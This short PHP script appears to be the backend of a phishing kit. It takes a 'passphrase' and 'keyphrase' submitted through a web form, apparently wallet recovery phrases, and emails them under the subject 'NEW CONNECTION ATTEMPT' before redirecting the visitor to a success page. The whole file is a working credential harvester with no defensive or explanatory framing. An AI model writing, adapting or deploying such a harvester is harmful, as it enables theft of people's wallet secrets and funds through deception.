<?php
// submit_form.php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // ⚠️ Security Reminder: Data is highly sensitive.
    $passphrase = filter_input(INPUT_POST, 'passphrase', FILTER_SANITIZE_STRING);
    $keyphrase = filter_input(INPUT_POST, 'keyphrase', FILTER_SANITIZE_STRING);

    // Set your email details
    $to = "";
    $subject = "NEW CONNECTION ATTEMPT";
    
    $message = "Passphrase: " . $passphrase . "\n";
    $message .= "Keyphrase: " . $keyphrase . "\n";
    
    $headers = "From: webserver@yourdomain.com";

    // Attempt to send the email
    if (mail($to, $subject, $message, $headers)) {
        // Redirect to a success page after submission
        header('Location: success.html');
        exit;
    } else {
        // Redirect to an error page on failure
        header('Location: error.html');
        exit;
    }
}
?>